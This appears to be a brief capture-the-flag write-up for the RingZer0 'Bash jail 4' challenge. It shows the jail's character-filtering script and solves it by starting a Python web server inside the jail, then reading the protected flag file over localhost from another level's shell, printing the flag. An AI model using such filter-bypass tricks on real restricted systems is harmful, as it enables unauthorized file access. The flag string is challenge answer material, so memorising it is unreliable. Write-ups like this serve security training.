# Bash jail 4 - Challenge 221

```
RingZer0 Team Online CTF

BASH Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksc'/''<''>''&''$']* ]]
        then
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input"
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output=`$input < /dev/null` &>/dev/null
                echo "Command executed"
        fi
done

-----------------------------
Your input:
```

Start a webserver with Python

```
python -m SimpleHTTPServer
```

From bash_jail1:

```
sh-4.3$ python3 1<&0
Python 3.4.3 (default, Oct 14 2015, 20:28:29)
[GCC 4.8.4] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.request
>>>
>>> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F\n'
```
